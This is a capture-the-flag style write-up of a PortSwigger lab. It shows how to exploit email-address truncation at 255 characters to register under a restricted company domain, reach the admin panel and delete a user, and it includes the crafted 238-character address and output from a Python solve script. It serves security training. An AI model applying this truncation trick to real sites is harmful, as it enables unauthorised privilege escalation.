# Lab: Inconsistent handling of exceptional input

### Instructions

This lab doesn't adequately validate user input. You can exploit a logic flaw in its account registration process to gain access to administrative functionality. To solve the lab, access the admin panel and delete the user carlos. 

### Solution

Logging into the lab and browsing to `/admin` we get an error that this area is restricted to DontWannaCry employees only. On the registration page there is also a note telling DontWannaCry employees to register using their company email address. 

So we need to somehow register with a `@dontwannacry.com` email, while still being able to receive the confirmation link.

Opening the email client from the lab banner we get our disposable inbox address, something like `@YOUR-EMAIL-ID.web-security-academy.net`. We can receive emails here but obviously not at `@dontwannacry.com`.

The first thing we want to test is how the server handles long email addresses. We register with something like:

```
aaaaaaaaaa...aaa@YOUR-EMAIL-ID.web-security-academy.net
```

Where the string before the `@` is well over 200 characters. The confirmation email still arrives fine, we click the link and log in. Checking "My account" we can see the stored email has been cut off at 255 characters. The server accepted and confirmed the full address but only stored the first 255 characters.

Now we know how to abuse this. We craft a registration email in this format:

```
very-long-string@dontwannacry.com.YOUR-EMAIL-ID.web-security-academy.net
```

The confirmation email gets sent to the full address so it arrives in our inbox. But when the server stores it, it truncates at 255 characters. If we get the length of `very-long-string` exactly right, the truncation cuts off everything after `@dontwannacry.com`, leaving us registered as a DontWannaCry employee.

The math needed is straightforward:

```
255 - len("@dontwannacry.com") = 238 characters
```

So we need exactly 238 characters before the `@`. We register, receive the confirmation email, click the link and log in. Checking "My account" confirms the stored email now reads `aaaa...aaa@dontwannacry.com` and we have access to `/admin`. We delete carlos and the lab is solved.

### Python Solution

See `logic_vuln_06.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Business_Logic_Vulnerabilities/Logic_Vuln_06_inconsistent_handling_of_exceptional_input]
└─$ python logic_vuln_06.py https://0a4f009304ba50fb82400bb7008d00d8.web-security-academy.net/
[+] Email client: https://exploit-0a9300b904e750d082740adb01a800b9.exploit-server.net/email
[+] Crafted email length: 315
[+] Crafted email: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@dontwannacry.com.exploit-0a9300b904e750d082740adb01a800b9.exploit-server.net
[*] Registering with email: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@dontwannacry.com.exploit-0a9300b904e750d082740adb01a800b9.exploit-server.net
[+] Registration successful
[*] Grabbing confirmation link...
[+] Confirmation link: https://0a4f009304ba50fb82400bb7008d00d8.web-security-academy.net/register?temp-registration-token=e6KSnCS59hLz9BY9Nfj888JYDU8GMSI2
[+] Account confirmed
[+] Login successful
[*] Deleting carlos...
[+] Carlos deleted - Lab solved!
```